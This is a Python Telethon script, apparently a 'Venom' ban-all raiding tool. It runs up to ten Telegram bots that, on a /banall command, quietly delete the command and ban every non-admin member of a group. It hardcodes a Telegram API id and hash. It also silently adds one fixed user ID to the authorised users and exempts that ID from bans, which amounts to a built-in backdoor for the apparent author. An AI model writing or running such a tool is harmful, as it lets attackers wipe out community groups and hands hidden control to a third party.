import logging
from decouple import config
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN1 = config("BOT_TOKEN1", None)
BOT_TOKEN2 = config("BOT_TOKEN2", None)
BOT_TOKEN3 = config("BOT_TOKEN3", None)
BOT_TOKEN4 = config("BOT_TOKEN4", None)
BOT_TOKEN5 = config("BOT_TOKEN5", None)
BOT_TOKEN6 = config("BOT_TOKEN6", None)
BOT_TOKEN7 = config("BOT_TOKEN7", None)
BOT_TOKEN8 = config("BOT_TOKEN8", None)
BOT_TOKEN9 = config("BOT_TOKEN9", None)
BOT_TOKEN10 = config("BOT_TOKEN10", None)
SUDO_USERS = list(map(int, getenv("SUDO").split()))
Venom = [6812888267]
ALTRONS = [-1002110180871]
SUDO_USERS.append(6812888267)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
Venom1 = TelegramClient('Venom1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
Venom2 = TelegramClient('Venom2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
Venom3 = TelegramClient('Venom3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
Venom4 = TelegramClient('Venom4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
Venom5 = TelegramClient('Venom5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
Venom6 = TelegramClient('Venom6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
Venom7 = TelegramClient('Venom7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
Venom8 = TelegramClient('Venom8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
Venom9 = TelegramClient('Venom9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
Venom10 = TelegramClient('Venom10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)


@Venom1.on(events.NewMessage(pattern="^/banall"))
@Venom2.on(events.NewMessage(pattern="^/banall"))
@Venom3.on(events.NewMessage(pattern="^/banall"))
@Venom4.on(events.NewMessage(pattern="^/banall"))
@Venom5.on(events.NewMessage(pattern="^/banall"))
@Venom6.on(events.NewMessage(pattern="^/banall"))
@Venom7.on(events.NewMessage(pattern="^/banall"))
@Venom8.on(events.NewMessage(pattern="^/banall"))
@Venom9.on(events.NewMessage(pattern="^/banall"))
@Venom10.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
   if event.sender_id in SUDO_USERS:
        await event.delete()
        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        all = 0
        bann = 0
        if int(event.chat_id) in ALTRONS:
            return
        async for user in event.client.iter_participants(event.chat_id):
            all += 1
            try:
                if user.id not in admins_id and user.id not in Venom:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
            except Exception as e:
                pass


print("ꪜꫀŇ𐍉ꪑ 𝙓 𝐵𝐴𝑁-𝐴𝐿𝐿")

Venom1.run_until_disconnected()
Venom2.run_until_disconnected()
Venom3.run_until_disconnected()
Venom4.run_until_disconnected()
Venom5.run_until_disconnected()
Venom6.run_until_disconnected()
Venom7.run_until_disconnected()
Venom8.run_until_disconnected()
Venom9.run_until_disconnected()
Venom10.run_until_disconnected()
